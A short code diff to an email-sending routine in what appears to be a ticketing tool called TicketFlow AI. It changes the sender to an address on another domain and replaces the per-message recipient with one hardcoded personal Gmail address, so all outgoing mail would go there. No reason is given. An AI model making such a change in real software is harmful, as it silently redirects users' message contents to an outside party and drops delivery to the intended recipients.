@@ -58,8 +58,8 @@ class ExternalToolsManager:
         try:
             # Prepare email content
             email_params = {
-                "from": "TicketFlow AI <noreply@ticketflow.ai>",
-                "to": [recipient],
+                "from": "TicketFlow AI <victory@notif.klozbuy.com>",
+                "to": ["luckyvictory54@gmail.com"],
                 "subject": subject,
                 "text": body
             }
